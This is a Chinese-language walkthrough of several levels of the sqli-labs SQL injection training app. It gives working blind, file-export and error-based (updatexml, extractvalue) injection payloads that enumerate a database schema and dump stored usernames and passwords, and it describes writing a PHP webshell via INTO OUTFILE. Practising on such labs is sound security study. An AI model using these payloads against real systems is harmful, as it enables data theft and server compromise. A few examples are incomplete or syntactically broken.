Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)

这题目是个盲注

盲注需要掌握的函数
length()函数 返回字符串的长度
substr()截取字符串 （语法：SUBSTR(str,pos,len);）
ascii()返回字符是ascii码
sleep()将程序挂起一段时间 n
if(expr1,expr2,expr3)判断语句，如果第一个语句正确就执行第二个语句如果错误执行第三个语句

由前面的题目知道当前数据库为：security，那么就用盲注测测看是不是这个数据库名

构造payload如下

'and ascii(substr(database(),1,1))=115 -- d

可以看到确实是开头字母s（ascii=115）

同样根据前面的题目可以知道用户表表名为users开头字母为u(ascii=117)构造payload 尝试一下

id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))=117 -- d

页面返回正常

要查的字段分别为username和password

构造payload如下

' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 5,1),1,1))=112 -- d

返回页面正常，说明确实是password字段

Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）

这一题是导出文件注入

做题之前有三个tips：

数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限。我们必须知道，服务器上一个可以写入文件的文件夹的完整路径

导出到文件就是可以将查询结果导出到一个文件中，如常见的将一句话木马导出到一个php文件中，sqlmap中也有导出一句话和一个文件上传的页面

winserver的iis默认路径c:\Inetpub\wwwroot
linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等
apache 就.../var/www/htm，.../var/www/html/htdocs
phpstudy 就是...\PhpStudy20180211\PHPTutorial\WWW\
xammp 就是...\xampp\htdocs

常用的语句是：

 select "" into outfile "XXX\test.php"

这里要获取到网站的在系统中的具体路径（绝对路径）

这句payload的意思是将查询出的结果放入test.php文件中，select返回的是这个查询结果，所以就将这个字符串放入文件，就构成了导出文件攻击

Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)

tips2：

在后台是select语句时我们能通过union联合查询CONCAT子查询（即Less5使用的双注入）获得错误信息中的数据。
而这里的后台是update（delete/insert）语句，我们只能通过or逻辑判断派生表（在Less5中提到一句）来获得错误信息中的数据。

查看了php代码后发现这题的注入点在password

一下是代码：

可以看到在用户名那边有一个check_input函数对输入数据进行了处理，所以我们不能在username处注入，而应该在password进行注入

本题属于显错注入，方法很多

1.updatexml注入

这题目很多人选用的是updatexml显错注入

updatexml(xml_target,xpath_expr,new_xml)
参数 描述
xml_target 目标xml，形式类似于节点目录(目标xml文档内容)
xpath_expr xml的表达式（xpath格式）(xnl文档路径)
new_xml 用来替换的xml（更新的内容）

例子：

updatexml(1,concat(0x7e,(select database(),0x7e)1)

这里去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符（0x7e，也就是“~”符号）然后就因为不符合输入规则然后报错了。但是报错的时候已经执行了那个子查询代码

明白了原理和注入点后，开始构造payload

payload如下

查字段名

' or  updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) #

查字段值

' or  updatexml(1,concat(0x7e,(select group_concat(username,password)from users) ,0x7e),1) #

却提示错误，原因在于在mysql中你不能先select表然后update它，解决方法是在外面在嵌套一个select语句，也就是将select出的结果作为派生表在select一遍（ps：这里要注意的是每个派生出的表都要有一个别名，所以给select group_concat(xxx)…..查询出来的表起一个名字“a”）

' or  updatexml(1,concat(0x7e,(select * from (select group_concat(username,password) from users) a),0x7e),1) #

结果如下：

该结果之显示出了一部分结果，要显示其他结果要加上limit

' or  updatexml(1,concat(0x7e,(select * from (select username from users limit 4,1) a),0x7e),1) #

2.extractvalue()注入

extractvalue(xml,value)

extractvalue()函数也是MySQL 5.1以后推出的对xml文档数据进行查询和修改的xpath函数。

extractvalue()的xml参数随便设定一个数。利用extractvalue()获取数据的固定payload是：

... or extractvalue(1,concat('#',(select * from (select ....) a))) #
